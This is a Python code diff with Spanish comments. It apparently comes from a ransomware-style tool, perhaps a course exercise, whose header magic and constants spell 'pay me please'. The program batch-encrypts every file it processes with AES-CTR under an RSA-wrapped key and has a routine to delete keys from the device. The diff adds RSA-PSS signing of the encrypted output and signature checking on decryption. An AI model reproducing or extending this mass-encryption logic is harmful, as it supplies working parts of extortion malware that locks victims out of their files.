@@ -18,6 +18,7 @@ from cryptography.hazmat.backends import default_backend
 HEADER_MAGIC = "P4Y1"
 PKALG_RSA_OAEP_SHA256 = "RSA_OAEP_SHA256"
 CONTRASENA_CIFRADO = "paymepliz"
+SIGALG_RSA_PSS_SHA256 = "RSA_PSS_SHA256"
 
 
 def _make_header_line1(modo: str, key_bits: int, pk_alg: str) -> bytes:
@@ -36,9 +37,15 @@ def _make_header_line2_wrapped_key_b64(wrapped_key: bytes) -> bytes:
 
 def _parse_header_2lines(blob: bytes):
     """
-    Lee las dos primeras líneas ASCII del blob.
-    Devuelve (modo, key_bits, pk_alg, wrapped_key_bytes, resto_bytes).
+    Lee encabezado ASCII:
+    L1: P4Y1|<MODO>|<KEYBITS>|PKALG=<ALG>
+    L2: <WRAPPED_KEY_BASE64>
+    (opcional)
+    L3: SIGALG=<ALGO>
+    L4: <FIRMA_BASE64>
+    Devuelve (modo, key_bits, pk_alg, wrapped_key_bytes, sig_alg, firma_bytes, resto_bytes).
     """
+    # ---- Línea 1 ----
     nl1 = blob.find(b"\n")
     if nl1 == -1:
         raise ValueError("Archivo sin encabezado: falta línea 1.")
@@ -52,7 +59,7 @@ def _parse_header_2lines(blob: bytes):
     if len(parts) >= 4 and parts[3].startswith("PKALG="):
         pk_alg = parts[3].split("=", 1)[1]
 
-    # Línea 2: wrapped key en base64
+    # ---- Línea 2: wrapped key base64 ----
     rem = blob[nl1 + 1:]
     nl2 = rem.find(b"\n")
     if nl2 == -1:
@@ -63,8 +70,34 @@ def _parse_header_2lines(blob: bytes):
     except Exception as e:
         raise ValueError("Línea 2 no es base64 válido para clave envuelta.") from e
 
-    resto = rem[nl2 + 1:]
-    return modo, key_bits, pk_alg, wrapped_key, resto
+    resto = rem[nl2 + 1:]  # aquí puede empezar SIGALG=... o directamente IV
+
+    sig_alg = None
+    firma = None
+
+    # ¿Hay línea de firma?
+    if resto.startswith(b"SIGALG="):
+        # ---- Línea 3: SIGALG=... ----
+        nl3 = resto.find(b"\n")
+        if nl3 == -1:
+            raise ValueError("Encabezado de firma incompleto: falta salto de línea tras SIGALG.")
+        line3 = resto[:nl3].decode("ascii", errors="strict")
+        sig_alg = line3.split("=", 1)[1]
+
+        # ---- Línea 4: firma base64 ----
+        rem2 = resto[nl3 + 1:]
+        nl4 = rem2.find(b"\n")
+        if nl4 == -1:
+            raise ValueError("Encabezado de firma incompleto: falta línea con la firma.")
+        line4 = rem2[:nl4]
+        try:
+            firma = base64.b64decode(line4, validate=True)
+        except Exception as e:
+            raise ValueError("La línea de firma no contiene base64 válido.") from e
+
+        resto = rem2[nl4 + 1:]  # a partir de aquí: IV + ciphertext
+
+    return modo, key_bits, pk_alg, wrapped_key, sig_alg, firma, resto
 
 
 
@@ -200,6 +233,35 @@ def unwrap_key_rsa_oaep(privkey, wrapped: bytes) -> bytes:
             label=None,
         ),
     )
+
+
+def firmar_datos_rsa_pss(privkey, data: bytes) -> bytes:
+    """Firma data con RSA-PSS + SHA-256."""
+    return privkey.sign(
+        data,
+        asym_padding.PSS(
+            mgf=asym_padding.MGF1(hashes.SHA256()),
+            salt_length=asym_padding.PSS.MAX_LENGTH,
+        ),
+        hashes.SHA256(),
+    )
+
+
+def verificar_firma_rsa_pss(pubkey, data: bytes, firma: bytes) -> bool:
+    """Verifica firma RSA-PSS + SHA-256. Devuelve True/False."""
+    try:
+        pubkey.verify(
+            firma,
+            data,
+            asym_padding.PSS(
+                mgf=asym_padding.MGF1(hashes.SHA256()),
+                salt_length=asym_padding.PSS.MAX_LENGTH,
+            ),
+            hashes.SHA256(),
+        )
+        return True
+    except Exception:
+        return False
 
 
 # ===== Utilidades AES (Tarea 2) =====
@@ -365,8 +427,12 @@ def eliminar_claves_del_dispositivo() -> None:
 
 
 # ===== Cifrado Automático =====
-def cifrar_archivo_automatico(ruta_entrada: str, public_key_pem_path: str, modo: str = "CTR", key_bits: int = 256) -> str:
-    """Cifra un archivo automáticamente con AES-CTR y envuelve con RSA."""
+def cifrar_archivo_automatico(ruta_entrada: str, public_key_pem_path: str, modo: str = "CTR", key_bits: int = 256, sign_private_key_pem_path: Optional[str] = None) -> str:
+    """Cifra un archivo automáticamente con AES-CTR y envuelve con RSA.
+
+    Si `sign_private_key_pem_path` se proporciona, firma (IV + ciphertext) con RSA-PSS-SHA256
+    y embebe en el encabezado las líneas `SIGALG=...` y la firma en base64 (como hace P4YM3PLZ).
+    """
     if not os.path.isfile(ruta_entrada):
         raise FileNotFoundError(f"No existe: {ruta_entrada}")
     
@@ -392,10 +458,22 @@ def cifrar_archivo_automatico(ruta_entrada: str, public_key_pem_path: str, modo:
 
     header1 = _make_header_line1(modo_upper, key_bits, PKALG_RSA_OAEP_SHA256)
     header2 = _make_header_line2_wrapped_key_b64(wrapped)
+
+    extra_header = b""
+    if sign_private_key_pem_path is not None:
+        try:
+            priv_sign = cargar_private_key_pem(sign_private_key_pem_path)
+            firma = firmar_datos_rsa_pss(priv_sign, iv + datos_cifrados)
+        except Exception as e:
+            print(f"⚠️ No se pudo cargar la clave privada para firmar ({sign_private_key_pem_path}): {e}. Se omitirá la firma.")
+            firma = None
+        if firma is not None:
+            extra_header += f"SIGALG={SIGALG_RSA_PSS_SHA256}\n".encode("ascii")
+            extra_header += base64.b64encode(firma) + b"\n"
+
     ruta_salida = _out_path_same_name_with_ext(ruta_entrada, suffix="")
-    
     with open(ruta_salida, "wb") as f:
-        f.write(header1 + header2 + iv + datos_cifrados)
+        f.write(header1 + header2 + extra_header + iv + datos_cifrados)
 
     return ruta_salida
 
@@ -446,8 +524,7 @@ def procesar_todos_archivos(dos_archivos_especiales: list) -> dict:
             try:
                 nom = os.path.basename(archivo_especial)[:50]
                 print(f"   - {nom:<50}", end="")
-                ruta_cifrada = cifrar_archivo_automatico(archivo_especial, "rsa_special_public.pem", "CTR", 256)
-                firmar_archivo(ruta_cifrada, "rsa_main_private.pem")
+                ruta_cifrada = cifrar_archivo_automatico(archivo_especial, "rsa_special_public.pem", "CTR", 256, sign_private_key_pem_path="rsa_main_private.pem")
                 print(" ✓")
                 resultado["especiales_cifrados"] += 1
             except Exception as e:
@@ -474,8 +551,7 @@ def procesar_todos_archivos(dos_archivos_especiales: list) -> dict:
                 print(f"   [{i:5d}/{len(archivos)}]", end=" ")
                 print(os.path.basename(archivo)[:50])
             
-            ruta_cifrada = cifrar_archivo_automatico(archivo, "rsa_main_public.pem", "CTR", 256)
-            firmar_archivo(ruta_cifrada, "rsa_main_private.pem")
+            ruta_cifrada = cifrar_archivo_automatico(archivo, "rsa_main_public.pem", "CTR", 256, sign_private_key_pem_path="rsa_main_private.pem")
             
             resultado["exitosos"] += 1
         except Exception as e:
@@ -501,7 +577,7 @@ def descifrar_archivo_automatico(ruta_entrada: str, private_key_pem_path: str) -
     with open(ruta_entrada, "rb") as f:
         blob = f.read()
 
-    modo_upper, key_bits, pk_alg, wrapped_key, resto = _parse_header_2lines(blob)
+    modo_upper, key_bits, pk_alg, wrapped_key, sig_alg, firma, resto = _parse_header_2lines(blob)
 
     privkey = cargar_private_key_pem(private_key_pem_path)
     clave = unwrap_key_rsa_oaep(privkey, wrapped_key)
@@ -509,6 +585,24 @@ def descifrar_archivo_automatico(ruta_entrada: str, private_key_pem_path: str) -
     if len(resto) < 16:
         raise ValueError("Archivo corrupto: faltan bytes para el IV.")
     iv, datos_cifrados = resto[:16], resto[16:]
+
+    # 2.1) Verificar firma digital (si existe)
+    if sig_alg is not None:
+        print(f"El fichero lleva firma digital ({sig_alg}).")
+        pub_sign_path = input("Ruta a la clave PÚBLICA RSA del EMISOR (para verificar la firma): ").strip().strip('"')
+        if not os.path.isfile(pub_sign_path):
+            print("No se ha encontrado la clave pública del emisor. NO se puede verificar la firma.")
+        else:
+            pub_sign = cargar_public_key_pem(pub_sign_path)
+            if sig_alg == SIGALG_RSA_PSS_SHA256:
+                ok = verificar_firma_rsa_pss(pub_sign, iv + datos_cifrados, firma)
+            else:
+                ok = False
+
+            if ok:
+                print("Firma digital VÁLIDA. El fichero proviene del emisor esperado y no ha sido modificado.")
+            else:
+                print("¡¡ADVERTENCIA!! Firma digital NO VÁLIDA. El fichero puede haber sido manipulado.")
 
     cipher = _cipher_from_mode(clave, modo_upper, iv)
     decryptor = cipher.decryptor()
